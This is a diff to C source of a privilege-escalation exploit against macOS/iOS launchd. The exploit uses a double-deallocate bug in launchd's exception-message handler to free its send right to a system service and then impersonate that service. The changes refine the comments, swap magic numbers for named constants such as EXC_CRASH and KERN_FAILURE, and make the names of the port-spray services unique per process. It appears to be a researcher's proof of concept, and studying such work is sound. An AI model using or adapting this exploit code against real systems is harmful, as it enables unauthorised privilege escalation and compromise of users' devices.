@@ -16,9 +16,9 @@
  * ------------------------------------------------------------------------------------------------
  *
  *  Launchd multiplexes multiple different Mach message handlers over its main port, including a
- *  MIG handler for exception messages. If a process sends a mach_exception_raise,
- *  mach_exception_raise_state, or mach_exception_raise_state_identity message to its bootstrap
- *  port, launchd will receive and process that message as a host-level exception.
+ *  MIG handler for exception messages. If a process sends a mach_exception_raise or
+ *  mach_exception_raise_state_identity message to its bootstrap port, launchd will receive and
+ *  process that message as a host-level exception.
  *
  *  Unfortunately, launchd's handling of these messages is buggy. If the exception type is 10
  *  (EXC_CRASH), then launchd will deallocate the thread and task ports sent in the message and
@@ -30,8 +30,9 @@
  *
  *  This can be exploited to free launchd's send right to any Mach port to which the attacking
  *  process also has a send right. In particular, if the attacker can look up a system service
- *  using launchd, then it can free launchd's send right to that service and then impersonate it to
- *  the rest of the system. After that there are many different routes to gain system privileges.
+ *  using launchd, then it can free launchd's send right to that service and then impersonate the
+ *  service to the rest of the system. After that there are many different routes to gain system
+ *  privileges.
  *
  */
 
@@ -101,11 +102,11 @@ launchd_release_send_right_twice(mach_port_t send_right) {
 	// mach_exception_raise_state_identity MIG handler in launchd. This MIG handler, which is
 	// exposed over the bootstrap port, improperly calls mach_port_deallocate() on the supplied
 	// task and thread ports, even when returning an error condition due to supplying exception
-	// 10. This leads to a double-deallocate of those ports.
+	// 10 (EXC_CRASH). This leads to a double-deallocate of those ports.
 	const mach_port_t reply_port = mig_get_reply_port();
-	const uint32_t deallocate_ports_exception = 10; // EXC_CRASH
+	const uint32_t deallocate_ports_exception = EXC_CRASH;
 	const mach_msg_id_t mach_exception_raise_state_identity_id = 2407;
-	const kern_return_t RetCode_success = 5; // KERN_FAILURE
+	const kern_return_t RetCode_success = KERN_FAILURE;
 	const int32_t flavor = 6; // ARM_THREAD_STATE64
 	const uint32_t stateCnt = 144;
 
@@ -353,6 +354,7 @@ launchd_replace_service_port(const char *service_name,
 	assert(ports != NULL);
 	// Try a number of times to replace the freed port. It would be better if we could
 	// reliably wrap around the port, but it seems like that's not working for some reason.
+	unsigned pid = getpid();
 	for (size_t try = 0; ok && replacement_port == MACH_PORT_NULL;) {
 		// Allocate a bunch of ports that we will register with launchd.
 		fill_mach_port_array(ports, PORT_COUNT);
@@ -360,7 +362,8 @@ launchd_replace_service_port(const char *service_name,
 		// a persistent reference to the port in launchd's IPC space.
 		for (size_t i = 0; i < PORT_COUNT; i++) {
 			char service_name[64];
-			snprintf(service_name, sizeof(service_name), "launchd.replace.%zu", i);
+			snprintf(service_name, sizeof(service_name), "launchd.replace.%u.%zu",
+					pid, i);
 #pragma clang diagnostic push
 #pragma clang diagnostic ignored "-Wdeprecated-declarations"
 			kern_return_t kr = bootstrap_register(bootstrap_port, service_name,
